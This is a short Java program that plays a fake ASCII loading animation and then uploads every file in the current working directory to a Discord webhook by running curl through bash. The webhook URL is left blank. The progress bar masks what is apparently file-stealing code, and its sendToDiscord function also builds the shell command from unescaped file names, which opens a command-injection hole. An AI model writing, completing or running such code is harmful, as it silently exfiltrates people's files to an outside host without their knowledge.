import java.io.File;
import java.io.IOException;

public class script {

    public static void printAsciiAnimation(String[] asciiArt, int iterations, double delay) {
        for (int i = 0; i < iterations; i++) {
            for (String line : asciiArt) {
                System.out.print(line);
                try {
                    Thread.sleep((long) (delay * 1000));
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                System.out.print("\r");
            }
        }
        System.out.println();
    }
    public static void sendToDiscord(String fileName, String webhookUrl) {
        String curlCommand = String.format("curl -s -F file1=@\"%s\" \"%s\"", fileName, webhookUrl);
        ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c", curlCommand);

        try {
            Process process = processBuilder.start();
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                System.out.println("SEND : " + fileName);
            } else {
                System.err.println("ERROR WEBHOOK : " + fileName);
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void traverseDirectory(String folderPath, String webhookUrl) {
        File folder = new File(folderPath);
        File[] files = folder.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    String filePath = file.getAbsolutePath();
                    System.out.println("SEND : " + filePath);
                    sendToDiscord(filePath, webhookUrl);
                }
            }
        } else {
            System.err.println("ERROR : Path " + folderPath);
        }
    }
    public static void main(String[] args) {
        String[] loadingAnimation = {
                "[--------]   0% ",
                "[█-------]   10% ",
                "[██------]   20% ",
                "[███-----]   30% ",
                "[████----]   40% ",
                "[█████---]   50% ",
                "[██████--]   60% ",
                "[███████-]   70% ",
                "[████████]   100% "
        };

        printAsciiAnimation(loadingAnimation, 1, 0.1);

        String folderPath = System.getProperty("user.dir");
        String webhookUrl = ""; 
        traverseDirectory(folderPath, webhookUrl);
    }
}
